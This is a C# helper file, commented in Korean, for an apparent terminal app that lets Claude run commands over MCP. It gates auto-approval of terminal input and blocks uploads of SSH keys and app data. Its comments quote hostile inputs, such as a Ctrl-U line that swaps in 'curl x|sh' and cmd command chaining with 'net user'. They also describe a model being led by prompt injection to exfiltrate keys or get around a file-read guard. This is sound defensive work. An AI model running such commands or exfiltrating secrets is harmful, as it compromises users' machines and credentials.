using System;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text.Json;
using System.Text.RegularExpressions;

namespace Nubis;

/// <summary>MCP 도구의 화면과 무관한 판단 로직 (테스트 대상)</summary>
public static class McpHelpers
{
    /// <summary>텍스트에서 패턴이 나오는 횟수 (regex 가 아니면 대소문자 무시 문자열 검색). 잘못된 정규식은 ArgumentException</summary>
    public static int CountMatches(string text, string pattern, bool regex)
    {
        if (pattern.Length == 0) return 0;
        if (regex)
        {
            try { return new Regex(pattern, RegexOptions.Multiline, TimeSpan.FromSeconds(1)).Matches(text).Count; }
            catch (ArgumentException ex) { throw new ArgumentException($"잘못된 정규식입니다: {ex.Message}"); }
        }
        var n = 0;
        for (var i = text.IndexOf(pattern, StringComparison.OrdinalIgnoreCase); i >= 0;
             i = text.IndexOf(pattern, i + pattern.Length, StringComparison.OrdinalIgnoreCase)) n++;
        return n;
    }

    /// <summary>
    /// 숫자 인자: JSON 숫자 또는 숫자 문자열("10", "2.5"). 없거나 숫자가 아니거나 NaN·무한대면 null — 예외를 던지지 않는다.
    /// (입력을 보낸 뒤 인자 해석에서 예외가 나면 Claude 가 다시 보내 명령이 두 번 실행될 수 있으므로, 모든 인자는 실행 전에 이걸로 읽는다)
    /// </summary>
    public static double? NumberArg(JsonElement a, string name)
    {
        if (a.ValueKind != JsonValueKind.Object || !a.TryGetProperty(name, out var v)) return null;
        double d;
        if (v.ValueKind == JsonValueKind.Number) { if (!v.TryGetDouble(out d)) return null; }
        else if (v.ValueKind == JsonValueKind.String)
        {
            if (!double.TryParse((v.GetString() ?? "").Trim(), NumberStyles.Float, CultureInfo.InvariantCulture, out d)) return null;
        }
        else return null;
        return double.IsFinite(d) ? d : null;
    }

    private static string[] ScreenLines(string screen) => screen.Replace("\r", "").Split('\n');

    /// <summary>
    /// 셸 프롬프트로 돌아와 있는 화면에서 마지막 명령의 출력 + 지금 프롬프트 줄.
    /// 마지막 줄(지금 프롬프트)과 같은 글자로 시작하고 뒤에 명령이 붙은 줄을 위로 찾아, 그 다음 줄부터 돌려준다 (명령 줄 자체는 제외 — grep error 같은 명령 글자에 걸리지 않게).
    /// 화면의 줄 끝 공백은 잘려 있으므로 프롬프트 줄 끝에 공백을 하나 붙인다 ('$ ' 패턴용).
    /// 명령 줄을 못 찾으면(cd 로 프롬프트가 바뀜·화면 지움 등) null.
    /// </summary>
    public static string? OutputSinceLastCommand(string screen)
    {
        var lines = ScreenLines(screen).Select(l => l.TrimEnd()).ToList();
        while (lines.Count > 0 && lines[^1].Length == 0) lines.RemoveAt(lines.Count - 1);
        if (lines.Count < 2) return null;
        var prompt = lines[^1];
        for (var i = lines.Count - 2; i >= 0; i--)
        {
            if (lines[i].Length > prompt.Length && lines[i].StartsWith(prompt, StringComparison.Ordinal))
                return string.Join("\n", lines.Skip(i + 1).Take(lines.Count - i - 2).Append(prompt + " "));
        }
        return null;
    }

    /// <summary>
    /// wait_for_output 시작 때 '패턴이 이미 나와 있으니 바로 끝냄' 을 적용할지. 셸 프롬프트로 돌아와 있을 때(명령이 끝남)만 —
    /// 마지막 명령 이후 출력(OutputSinceLastCommand, 못 찾으면 마지막 '프롬프트+명령' 줄 뒤)에 패턴이 있으면 true.
    /// 아직 실행 중이면 false: tail -f 의 첫 줄에 남은 옛 ERROR 등 '이미 있던' 일치로 끝내지 않고 새로 나타나길 기다린다.
    /// </summary>
    public static bool AlreadyPresentAtPrompt(string screen, string pattern, bool regex, bool atPrompt)
    {
        if (!atPrompt || pattern.Length == 0) return false;
        var recent = OutputSinceLastCommand(screen) ?? OutputAfterLastPromptCommand(screen);
        return recent != null && CountMatches(recent, pattern, regex) > 0;
    }

    /// <summary>
    /// 앞 화면(previous) 뒤에 새로 붙은 부분에서 패턴이 나온 횟수 — 화면을 마지막 N 줄씩 읽어 오래된 줄이 창 밖으로 밀려날 때 쓴다
    /// (전체 개수 비교는 밀려난 줄만큼 새 일치를 놓친다).
    /// 앞 화면의 마지막 줄(아직 바뀌는 중일 수 있음)을 뺀 끝 5줄을 지금 화면에서 찾아 그 뒤만 센다.
    /// 앞 화면의 마지막 줄이 그대로(또는 뒤에 글자가 붙어) 이어지면 그 줄에 원래 있던 일치는 뺀다.
    /// 기준 줄을 못 찾으면(화면 지움, 한 번에 너무 많은 출력) 0 — 잘못 끝내는 것보다 기다리는 쪽을 택한다.
    /// </summary>
    public static int CountNewMatches(string previous, string current, string pattern, bool regex)
    {
        if (pattern.Length == 0) return 0;
        var prev = ScreenLines(previous);
        var cur = ScreenLines(current);
        if (prev.Length < 2) return 0;
        var anchorEnd = prev.Length - 1;
        var k = Math.Min(5, anchorEnd);
        var anchor = prev[(anchorEnd - k)..anchorEnd];
        if (anchor.All(string.IsNullOrWhiteSpace)) return 0;
        for (var i = cur.Length - k; i >= 0; i--)
        {
            var same = true;
            for (var j = 0; j < k && same; j++) same = cur[i + j] == anchor[j];
            if (!same) continue;
            var tail = cur[(i + k)..];
            if (tail.Length == 0) return 0;
            var n = CountMatches(string.Join("\n", tail), pattern, regex);
            var prevLast = prev[^1];
            if (prevLast.Length > 0 && tail[0].StartsWith(prevLast, StringComparison.Ordinal)) n -= CountMatches(prevLast, pattern, regex);
            return Math.Max(0, n);
        }
        return 0;
    }

    // 프롬프트 뒤에 명령이 입력된 줄: "user@host:~/app$ make", "[root@db ~]# yum install", "PS C:\work> npm ci"
    private static readonly Regex PromptCommandLine = new(
        @"^(?:\([^)]*\)\s*)?(?:[^@\s\[]+@[^:\s]+:(?:~\S*|/\S*)\s*[$#]|\[[^@\s\]]+@[^\s\]]+ [^\]]+\][$#]|PS (?:[A-Za-z]:\\[^>]*|\\\\[^>]+|[A-Za-z]+::[^>]*)>) +\S",
        RegexOptions.Compiled);

    /// <summary>
    /// 화면에 앱이 알아보는 셸 프롬프트에서 명령을 입력한 줄이 있는가 — 지금 실행 중인 명령이 끝나면 프롬프트로 돌아온 것을 알아볼 수 있다는 뜻.
    /// 그렇다면 '출력이 잠깐 멈춤' 으로 끝내지 않고 프롬프트가 돌아올 때까지 기다린다 (apt·docker pull 처럼 중간에 조용한 명령).
    /// </summary>
    public static bool HasPromptCommandLine(string screen) =>
        ScreenLines(screen).Any(l => PromptCommandLine.IsMatch(l.TrimEnd()));

    // 다른 프로그램의 입력 프롬프트로 보이는 줄: mysql> · sqlite> · postgres=# · >>> · ... · In [3]: · irb(main):001>
    private static readonly Regex ReplPromptLine = new(
        @"^(?:>>>|\.\.\.|In \[\d+\]:|irb\([^)]*\)[^>\s]*>|MariaDB \[[^\]]*\]>|[A-Za-z][\w.-]*(?:\([^)]*\))?(?:>|=#|=>|-#|->))(?:\s|$)",
        RegexOptions.Compiled);

    // 커서가 있는 마지막 줄이 입력을 기다리는 모양: 'Password:'·'Enter passphrase for key ...:'·'Verification code:',
    // 'Continue? [y/N]'·'(yes/no/[fingerprint])?', 물음표로 끝나는 질문, 알아보지 못한 원격 프롬프트('host$', 'host #', 'C:\>').
    // '45%'(진행률)·'...installed:' 같은 일반 출력의 끝 글자(%, :)는 입력 대기로 보지 않는다 — apt·curl 이 조용할 때 일찍 끝내지 않게.
    // '>' 는 '</html>' 같은 태그 끝, '#' 은 '#####' 진행 막대를 뺀다
    private static readonly Regex InputWaitLine = new(
        @"(?i)\b(?:password|passphrase|passcode|verification code|one-time|otp|token|pin|암호|비밀번호)\b[^:\n]*:$" +
        @"|\[[yn]/[yn]\]\??$|\((?:yes/no|y/n)[^)]*\)\??$|\?$" +
        @"|(?:^|[\s\w\]\)~])[$#]$(?<!##)" +
        @"|(?:^|[\s\w\]\)~:\\])>$(?<!<[^<>]*>)",
        RegexOptions.Compiled);

    /// <summary>마지막 줄(커서 줄)이 입력을 기다리는 모양인가 (InputWaitLine). 테스트용 공개</summary>
    public static bool LooksLikeInputWait(string line) => InputWaitLine.IsMatch(line.TrimEnd());

    /// <summary>
    /// 호스트 OS 표기(클라우드 동기화의 Os 등)가 Windows 로 보이는가 (대소문자 무시 "windows" 포함).
    /// Windows OpenSSH 서버의 기본 셸은 cmd(또는 PowerShell)라 sh 기준 읽기 전용 판정이 맞지 않는다
    /// (echo 'x &amp; net user ... &amp; ' 는 sh 에선 문자열이지만 cmd 에선 명령 연결) — 이런 SSH 대상은 자동 승인하지 않는다.
    /// </summary>
    public static bool IsWindowsOs(string? os) => os != null && os.Contains("windows", StringComparison.OrdinalIgnoreCase);

    /// <summary>승인 대기 뒤 다시 확인: 아직 목록에 있는 항목과 이미 사라진 항목으로 나눈다 (순서 유지)</summary>
    public static (System.Collections.Generic.List<T> Present, System.Collections.Generic.List<T> Gone) SplitStillPresent<T>(
        System.Collections.Generic.IEnumerable<T> items, Func<T, bool> stillPresent)
    {
        var present = new System.Collections.Generic.List<T>();
        var gone = new System.Collections.Generic.List<T>();
        foreach (var x in items) (stillPresent(x) ? present : gone).Add(x);
        return (present, gone);
    }

    /// <summary>
    /// 지금 실행 중인 명령이 앱이 알아보는 셸 프롬프트에서 입력됐는가 — 그렇다면 끝나면 프롬프트로 돌아온 것을 알아볼 수 있다.
    /// 화면의 '마지막' 프롬프트+명령 줄을 찾고, 그 뒤에 다른 프로그램의 입력 프롬프트(mysql>, >>>, Password: 등)로 보이는 줄이 없을 때만 true.
    /// 예전 화면에 남은 user@host:~$ 명령 줄 때문에 mysql·python·비밀번호 질문·알아보지 못한 원격 프롬프트 안에서도
    /// '프롬프트 복귀' 만 기다려 짧은 대기가 제한 시간까지 늘어나던 문제를 막는다. 애매하면 false(출력 멈춤 규칙).
    /// </summary>
    public static bool RunningCommandFromKnownPrompt(string screen)
    {
        var lines = ScreenLines(screen).Select(l => l.TrimEnd()).ToList();
        while (lines.Count > 0 && lines[^1].Length == 0) lines.RemoveAt(lines.Count - 1);
        var idx = lines.FindLastIndex(l => PromptCommandLine.IsMatch(l));
        if (idx < 0) return false;
        for (var i = idx + 1; i < lines.Count; i++)
            if (ReplPromptLine.IsMatch(lines[i])) return false;
        // 커서 줄(마지막 줄)이 명령 줄 자체가 아니고 입력을 기다리는 모양이면 프롬프트 복귀를 기다릴 근거가 없다
        return idx == lines.Count - 1 || !InputWaitLine.IsMatch(lines[^1]);
    }

    /// <summary>
    /// 화면의 마지막 '알아보는 프롬프트+명령' 줄 다음부터 끝까지 (명령 줄 자체는 제외). 그런 줄이 없거나 뒤에 아무것도 없으면 null.
    /// wait_for_output 을 부르기 전에 실행 중인 명령이 이미 패턴을 출력한 경우(docker compose up 의 'Listening' 등)를 알아보는 데 쓴다.
    /// </summary>
    public static string? OutputAfterLastPromptCommand(string screen)
    {
        var lines = ScreenLines(screen);
        var idx = Array.FindLastIndex(lines, l => PromptCommandLine.IsMatch(l.TrimEnd()));
        if (idx < 0 || idx == lines.Length - 1) return null;
        return string.Join("\n", lines.Skip(idx + 1));
    }

    /// <summary>
    /// 터미널 입력에 제어 문자가 있는가 (탭 제외 C0, DEL, C1). Ctrl-U(\x15)·DEL·ESC 시퀀스 등은 화면의 줄을 지우거나 바꿔
    /// 읽기 전용으로 판정한 글자와 실제로 실행되는 명령을 다르게 만들 수 있다 — 자동 승인 대상에서 뺀다.
    /// </summary>
    public static bool HasControlChars(string text)
    {
        foreach (var ch in text)
            if (ch < 0x20 && ch != '\t' || ch is >= '\x7f' and <= '\x9f') return true;
        return false;
    }

    /// <summary>
    /// 승인 창 표시용: 보이지 않는 제어 문자를 \xNN 으로 드러낸다 (줄바꿈 \n·\r\n 과 탭은 그대로, 단독 \r 은 \r 로 표시).
    /// 양방향 제어·폭 없는 문자(U+200B~U+200F, U+202A~U+202E, U+2066~U+2069, U+FEFF)도 \u{XXXX} 로 보인다.
    /// </summary>
    public static string VisibleControlChars(string text)
    {
        var sb = new System.Text.StringBuilder(text.Length);
        for (var i = 0; i < text.Length; i++)
        {
            var ch = text[i];
            if (ch == '\r' && i + 1 < text.Length && text[i + 1] == '\n') continue;   // \r\n → \n
            if (ch is '\n' or '\t') sb.Append(ch);
            else if (ch == '\r') sb.Append("\\r");
            else if (ch < 0x20 || ch is >= '\x7f' and <= '\x9f') sb.Append("\\x").Append(((int)ch).ToString("x2", CultureInfo.InvariantCulture));
            else if (ch is >= '​' and <= '‏' or >= '‪' and <= '‮' or >= '⁦' and <= '⁩' or '﻿')
                sb.Append("\\u{").Append(((int)ch).ToString("X4", CultureInfo.InvariantCulture)).Append('}');
            else sb.Append(ch);
        }
        return sb.ToString();
    }

    /// <summary>
    /// send_to_terminal 을 승인 없이 입력해도 되는가. 모두 만족할 때만:
    ///  - 사용자가 '읽기 전용 명령은 승인 없이 실행'(AutoApproveReadOnly) 을 켰다
    ///  - 화면에 셸 프롬프트가 보인다 — sudo 비밀번호 질문·vim·mysql 안이면 같은 글자도 다른 뜻이 된다
    ///  - 한 줄이고 Enter 로 실행한다 (여러 줄·Enter 없는 입력은 프롬프트 상태를 바꿀 수 있음)
    ///  - ReadOnlyCommands 가 읽기 전용으로 본다 (허용 목록 방식, 애매하면 아님)
    ///  - 로컬 터미널(이 PC 의 PowerShell)이 아니다 — gc ~\.ssh\id_rsa 같은 읽기 명령으로 이 PC 의 비밀 파일을 화면에 띄워
    ///    read_terminal 로 읽으면 ClaudeGuard 의 파일 읽기 차단을 우회하게 된다
    ///  - 제어 문자(탭 제외)가 없다 — "ls \x15curl x|sh" 처럼 Ctrl-U 로 줄을 지우고 다른 명령으로 바꿀 수 있다
    ///  - OS 가 Windows 로 보이는 SSH 대상이 아니다 (windowsHost) — 셸이 cmd/PowerShell 이라 sh 기준 판정이 맞지 않는다
    /// </summary>
    public static bool CanAutoApproveTerminalInput(bool settingOn, string text, bool pressEnter, bool atPrompt, Func<string, bool> isReadOnly,
        bool localTerminal = false, bool windowsHost = false) =>
        settingOn && !localTerminal && !windowsHost && atPrompt && pressEnter && text.Trim().Length > 0 && !HasControlChars(text) && isReadOnly(text);

    /// <summary>앞부분에 NUL 이 있거나 제어 문자가 많으면 바이너리로 본다</summary>
    public static bool LooksBinary(ReadOnlySpan<byte> data)
    {
        var sample = data[..Math.Min(data.Length, 8192)];
        if (sample.IndexOf((byte)0) >= 0) return true;
        var control = 0;
        foreach (var b in sample)
            if (b < 32 && b is not (9 or 10 or 12 or 13 or 27)) control++;
        return sample.Length > 0 && control * 100 / sample.Length > 10;
    }

    /// <summary>
    /// 업로드 금지 로컬 파일: Nubis 데이터 폴더(계정·Vault·설정·감사 로그)와 SSH 개인키 폴더.
    /// Claude 가 프롬프트 주입 등으로 계정 파일을 서버로 내보내지 못하게 한다 (승인 창 이전에 거부).
    /// </summary>
    public static string? BlockedUploadReason(string localPath, string dataDir, string? rootDir = null)
    {
        // 장치 경로(\\?\, \\.\, \??\)와 이 PC 를 가리키는 UNC(\\localhost\c$ 등)는 받지 않는다 — 문자열 비교를 돌아가는 우회로가 된다.
        // 다른 서버의 일반 공유(네트워크 드라이브)는 허용
        var trimmed = localPath.Trim();
        if (trimmed.StartsWith(@"\\?\", StringComparison.Ordinal) || trimmed.StartsWith(@"\\.\", StringComparison.Ordinal) ||
            trimmed.StartsWith(@"\??\", StringComparison.Ordinal) || trimmed.StartsWith("//", StringComparison.Ordinal))
            return "장치 경로는 업로드할 수 없습니다. 드라이브 경로(C:\\...)나 일반 네트워크 공유 경로를 쓰세요.";
        if (IsLocalOrAdminUnc(trimmed))
            return "이 PC 를 가리키는 네트워크 경로나 관리 공유($)는 업로드할 수 없습니다. 드라이브 경로(C:\\...)를 쓰세요.";
        // 드라이브 문자 뒤의 ':' 는 대체 데이터 스트림(file.txt:stream) — 이름 검사를 돌아갈 수 있어 거부
        if (trimmed.Length > 2 && trimmed.IndexOf(':', 2) >= 0) return "잘못된 경로입니다.";
        string full;
        try { full = Path.GetFullPath(trimmed); }
        catch { return "잘못된 경로입니다."; }
        // 실제 경로: 8.3 짧은 이름(ABCDEF~1)·심볼릭 링크·정션을 풀어 최종 경로로 비교한다. 파일이 없으면 GetFullPath 값
        var final = FinalPath(full);
        if (IsLocalOrAdminUnc(final))
            return "이 PC 를 가리키는 네트워크 경로나 관리 공유($)로 이어지는 링크는 업로드할 수 없습니다.";
        static bool Under(string path, string dir)
        {
            var d = dir.TrimEnd(Path.DirectorySeparatorChar) + Path.DirectorySeparatorChar;
            return path.StartsWith(d, StringComparison.OrdinalIgnoreCase) || path.Equals(d.TrimEnd(Path.DirectorySeparatorChar), StringComparison.OrdinalIgnoreCase);
        }
        // 비교 대상 폴더도 짧은 이름·링크를 풀어 두 형태 모두와 비교한다
        static bool UnderAny(string full, string final, string dir)
        {
            string d;
            try { d = Path.GetFullPath(dir); } catch { return false; }
            var dFinal = FinalPath(d);
            return Under(full, d) || Under(final, d) || Under(full, dFinal) || Under(final, dFinal);
        }
        if (UnderAny(full, final, dataDir)) return "Nubis 데이터 폴더(계정·Vault·설정)의 파일은 업로드할 수 없습니다.";
        // 계정별 프로필을 쓰면 dataDir 은 users\<계정> 이고, 공통 폴더(login.json, 다른 계정의 users\**)는 따로 막는다
        if (rootDir != null && UnderAny(full, final, rootDir)) return "Nubis 데이터 폴더(로그인 설정·계정별 프로필)의 파일은 업로드할 수 없습니다.";
        var ssh = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".ssh");
        if (UnderAny(full, final, ssh)) return "~/.ssh 폴더(개인키)의 파일은 업로드할 수 없습니다.";
        foreach (var p in new[] { full, final })
        {
            var name = Path.GetFileName(p).ToLowerInvariant();
            if (name is "id_rsa" or "id_ed25519" or "id_ecdsa" or "id_dsa" || name.EndsWith(".ppk") || name.EndsWith(".pem"))
                return "개인키로 보이는 파일은 업로드할 수 없습니다.";
        }
        return null;
    }

    /// <summary>
    /// UNC 경로(\\host\share\...)가 이 PC 를 가리키거나(localhost·127.x·::1·이 PC 이름·이 PC 의 IP) 관리 공유(c$, admin$ 등 '$' 로 끝남)인가.
    /// 이런 경로는 로컬 파일을 다른 이름으로 가리켜 데이터 폴더·~/.ssh 차단을 돌아갈 수 있다. UNC 가 아니면 false
    /// </summary>
    public static bool IsLocalOrAdminUnc(string path)
    {
        if (!path.StartsWith(@"\\", StringComparison.Ordinal) || path.StartsWith(@"\\?\", StringComparison.Ordinal) || path.StartsWith(@"\\.\", StringComparison.Ordinal))
            return false;
        var parts = path[2..].Split(['\\', '/'], StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length == 0) return true;   // "\\" 만 있으면 거부
        var host = parts[0].TrimEnd('.').ToLowerInvariant();
        if (parts.Length > 1 && parts[1].EndsWith('$')) return true;
        if (host is "localhost" or "." or "?" or "::1" or "0.0.0.0" || host.StartsWith("127.") || host.EndsWith(".localhost")) return true;
        var machine = Environment.MachineName.ToLowerInvariant();
        if (host == machine || host.StartsWith(machine + ".")) return true;
        try
        {
            // 이 PC 의 IP 로 가리키는 경우 (DNS 조회 없이 로컬 인터페이스 주소만 비교)
            if (System.Net.IPAddress.TryParse(host.Trim('[', ']'), out var ip))
                foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
                    foreach (var ua in ni.GetIPProperties().UnicastAddresses)
                        if (ua.Address.Equals(ip)) return true;
        }
        catch { return true; }   // 판단할 수 없으면 막는다
        return false;
    }

    /// <summary>
    /// 있는 파일·폴더의 최종 경로 (GetFinalPathNameByHandle: 8.3 짧은 이름·심볼릭 링크·정션을 푼 실제 경로).
    /// \\?\C:\... 는 C:\..., \\?\UNC\srv\share 는 \\srv\share 로 돌려준다. 열 수 없으면(없는 경로 등) 받은 경로 그대로.
    /// </summary>
    internal static string FinalPath(string fullPath)
    {
        try
        {
            using var h = CreateFileW(fullPath, 0, 7 /* 읽기·쓰기·삭제 공유 */, IntPtr.Zero, 3 /* OPEN_EXISTING */,
                0x02000000 /* FILE_FLAG_BACKUP_SEMANTICS (폴더도 열기) */, IntPtr.Zero);
            if (h.IsInvalid) return fullPath;
            return FinalPathOfHandle(h) ?? fullPath;
        }
        catch { return fullPath; }
    }

    /// <summary>열린 핸들의 최종 경로 (\\?\ 접두어 제거). 실패하면 null</summary>
    private static string? FinalPathOfHandle(Microsoft.Win32.SafeHandles.SafeFileHandle h)
    {
        var sb = new System.Text.StringBuilder(1024);
        var n = GetFinalPathNameByHandleW(h, sb, (uint)sb.Capacity, 0);
        if (n > sb.Capacity)
        {
            sb = new System.Text.StringBuilder((int)n + 1);
            n = GetFinalPathNameByHandleW(h, sb, (uint)sb.Capacity, 0);
        }
        if (n == 0 || n > sb.Capacity) return null;
        var s = sb.ToString();
        if (s.StartsWith(@"\\?\UNC\", StringComparison.OrdinalIgnoreCase)) return @"\\" + s[8..];
        if (s.StartsWith(@"\\?\", StringComparison.Ordinal)) return s[4..];
        return s;
    }

    /// <summary>
    /// 열린 업로드 파일 핸들에서 얻은 정보로 거부 사유 판단 (화면·파일과 무관, 테스트 대상).
    /// 폴더면 거부, 최종 경로가 차단 대상이면 거부, 하드 링크가 2개 이상이면 거부 —
    /// 하드 링크는 최종 경로가 링크 자신의 경로로 나와 ~/.ssh/id_rsa 같은 원본을 알아볼 수 없다.
    /// </summary>
    public static string? UploadHandleCheck(string? finalPath, uint numberOfLinks, bool isDirectory, string dataDir, string? rootDir)
    {
        if (finalPath == null) return "업로드할 파일의 실제 경로를 확인할 수 없습니다.";
        if (isDirectory) return "파일 대신 폴더가 열렸습니다 (승인 뒤 경로가 바뀌었을 수 있음).";
        if (BlockedUploadReason(finalPath, dataDir, rootDir) is { } why) return why;
        if (numberOfLinks > 1)
            return "하드 링크가 여러 개인 파일은 업로드할 수 없습니다 (개인키 등 다른 파일과 같은 내용일 수 있음). 파일을 복사한 뒤 그 사본을 올리세요.";
        return null;
    }

    /// <summary>
    /// 업로드할 로컬 파일을 열고, 그 '열린 핸들' 로 다시 검사한 뒤 같은 핸들로 읽는 스트림을 돌려준다.
    /// 승인 창 이전 검사와 실제 읽기 사이에 파일이 링크로 바뀌어도(TOCTOU) 핸들이 가리키는 실제 파일로 판단한다.
    /// 쓰기·삭제 공유 없이 열어 읽는 동안 내용·이름이 바뀌지 않게 한다. 거부하면 InvalidOperationException(사유).
    /// </summary>
    public static FileStream OpenUploadFile(string path, string dataDir, string? rootDir)
    {
        if (BlockedUploadReason(path, dataDir, rootDir) is { } pre) throw new InvalidOperationException(pre);
        var h = CreateFileW(path, 0x80000000 /* GENERIC_READ */, 1 /* FILE_SHARE_READ */, IntPtr.Zero, 3 /* OPEN_EXISTING */,
            0x08000000 /* FILE_FLAG_SEQUENTIAL_SCAN */, IntPtr.Zero);
        if (h.IsInvalid)
        {
            var err = System.Runtime.InteropServices.Marshal.GetLastWin32Error();
            h.Dispose();
            throw new InvalidOperationException($"로컬 파일을 열 수 없습니다: {path} ({new System.ComponentModel.Win32Exception(err).Message})");
        }
        try
        {
            var ok = GetFileInformationByHandle(h, out var info);
            var why = ok
                ? UploadHandleCheck(FinalPathOfHandle(h), info.NumberOfLinks, (info.FileAttributes & 0x10 /* DIRECTORY */) != 0, dataDir, rootDir)
                : "업로드할 파일 정보를 확인할 수 없습니다.";
            if (why != null) throw new InvalidOperationException(why);
            return new FileStream(h, FileAccess.Read);
        }
        catch
        {
            h.Dispose();
            throw;
        }
    }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    private struct ByHandleFileInformation
    {
        public uint FileAttributes;
        public uint CreationLow, CreationHigh, LastAccessLow, LastAccessHigh, LastWriteLow, LastWriteHigh;
        public uint VolumeSerialNumber, FileSizeHigh, FileSizeLow, NumberOfLinks, FileIndexHigh, FileIndexLow;
    }

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
    private static extern bool GetFileInformationByHandle(Microsoft.Win32.SafeHandles.SafeFileHandle file, out ByHandleFileInformation info);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode, SetLastError = true)]
    private static extern Microsoft.Win32.SafeHandles.SafeFileHandle CreateFileW(string fileName, uint desiredAccess, uint shareMode,
        IntPtr securityAttributes, uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode, SetLastError = true)]
    private static extern uint GetFinalPathNameByHandleW(Microsoft.Win32.SafeHandles.SafeFileHandle file, System.Text.StringBuilder path,
        uint pathLength, uint flags);

    /// <summary>원격 파일 이름 마지막 부분 (경로 구분자 제거)</summary>
    public static string RemoteFileName(string remotePath)
    {
        var p = remotePath.TrimEnd('/');
        var i = p.LastIndexOf('/');
        return i >= 0 ? p[(i + 1)..] : p;
    }

    /// <summary>"22,3389, 5985" → 포트 목록 (1~65535, 최대 10개, 중복 제거)</summary>
    public static int[] ParsePorts(System.Collections.Generic.IEnumerable<string> items) =>
        items.SelectMany(s => s.Split(',', ' ', StringSplitOptions.RemoveEmptyEntries))
            .Select(s => int.TryParse(s, out var n) ? n : 0)
            .Where(n => n is >= 1 and <= 65535)
            .Distinct().Take(10).ToArray();
}
